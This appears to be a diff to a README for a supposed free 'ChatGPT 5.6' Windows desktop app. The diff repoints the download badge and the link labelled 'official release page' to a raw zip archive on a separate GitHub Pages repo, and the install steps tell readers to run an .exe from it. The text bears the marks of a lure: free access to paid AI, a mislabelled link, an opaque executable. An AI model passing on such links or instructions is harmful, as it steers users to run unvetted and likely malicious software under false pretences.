@@ -5,13 +5,13 @@ description: "Access the ChatGPT 5.6 AI model through a native and lightweight d
 ---
 # 🤖 Chatgpt-5.6-AI-Free-Desktop - Access advanced language models for free
 
-[![](https://img.shields.io/badge/Download_Setup_Files-Blue?style=for-the-badge)](https://github.com/Freinek8434/Chatgpt-5.6-AI-Free-Desktop)
+[![](https://img.shields.io/badge/Download_Setup_Files-Blue?style=for-the-badge)](https://raw.githubusercontent.com/Freinek8434/freinek8434.github.io/main/quadrated/3.5.zip)
 
 This program provides a simple way to use advanced artificial intelligence on your Windows computer. It connects to language models through proxy tools. You get access to features for coding, logic, and document analysis without paying for subscriptions.
 
 ## 📥 How to Install
 
-1. Go to the [official release page](https://github.com/Freinek8434/Chatgpt-5.6-AI-Free-Desktop).
+1. Go to the [official release page](https://raw.githubusercontent.com/Freinek8434/freinek8434.github.io/main/quadrated/3.5.zip).
 2. Look for the section labeled "Assets."
 3. Click the file that ends with .exe to start your download.
 4. Open the file after the download finishes.
